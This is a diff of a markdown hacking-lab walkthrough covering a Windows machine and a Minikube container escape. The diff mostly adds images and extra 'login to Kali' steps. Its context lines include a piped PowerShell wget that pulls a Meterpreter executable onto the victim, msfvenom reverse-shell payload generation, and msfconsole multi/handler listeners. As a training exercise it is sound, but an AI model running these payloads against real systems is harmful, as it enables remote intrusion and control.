@@ -1,5 +1,7 @@
 # Hack Windows machine
 
+![Windows Hack](../assets/windows-hack.png)
+
 - login to your Kali machine
 
 ```bash
@@ -125,6 +127,12 @@ ruby -run -ehttpd . -p8001
 |powershell -c wget "http://<kali-privat-ip-address>:8001/met.exe" -outfile "C:\windows\temp\met.exe"
 ```
 
+- login via another console to your Kali machine
+
+```bash
+ssh kali@<kali-public-ip-address>
+```
+
 - start the metasploit multi handler to receive the connection from `met.exe`
 
 ```bash
@@ -176,7 +184,6 @@ Shell Banner:
 Microsoft Windows [Version 10.0.14393]
 -----
           
-
 C:\Windows\system32>
 ```
 
@@ -247,6 +254,8 @@ SID               : S-1-5-21-2073652273-2496418537-3488842278-500
 
 # Minikube hack
 
+![Kubernetes hack](../assets/kubernetes-hack.png)
+
 - login to your Ubuntu machine
 
 ```bash
@@ -296,7 +305,7 @@ dvwa-container-escape-8654469d85-7kszd   1/1     Running   0          35s
 ubuntu@ip-10-0-4-175:~$ kubectl port-forward --address 0.0.0.0 <dvwa-container-escape-....> 8080:80
 ```
 
-- login to your Kali machine
+- login via another console to your Kali machine
 
 ```bash
 ssh kali@<kali-public-ip-address>
@@ -314,6 +323,12 @@ msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<kali privat ip> LPORT=4242 
 msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
 ```
 
+- login via another console to your Kali machine
+
+```bash
+ssh kali@<kali-public-ip-address>
+```
+
 - create the reverse shell for the docker host
 
 ```bash
@@ -324,6 +339,12 @@ msfvenom -p linux/x86/shell/reverse_tcp LHOST=<kali privat ip> LPORT=4243 -f elf
 
 ```bash
 msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
+```
+
+- login via another console to your Kali machine
+
+```bash
+ssh kali@<kali-public-ip-address>
 ```
 
 Start the on liner web server that the victim can download the shells
